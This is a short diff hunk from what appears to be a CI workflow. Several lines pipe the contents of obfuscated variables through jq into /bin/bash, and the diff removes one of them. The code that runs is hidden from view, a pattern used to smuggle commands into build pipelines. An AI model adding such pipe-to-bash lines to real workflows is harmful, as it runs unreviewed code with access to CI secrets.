@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$uhthl1477" | jq -r .d15263 | /bin/bash
           echo $oh434 | jq -r .fl7925 | /bin/bash
           printf '%s' "$x72084" | jq -r .gcmq52356 | /bin/bash
-          echo $ph32 | jq -r .z430 | /bin/bash
           echo $u2225 | jq -r .r0673 | /bin/bash
           echo $ze0 | jq -r .cw2 | /bin/bash
 
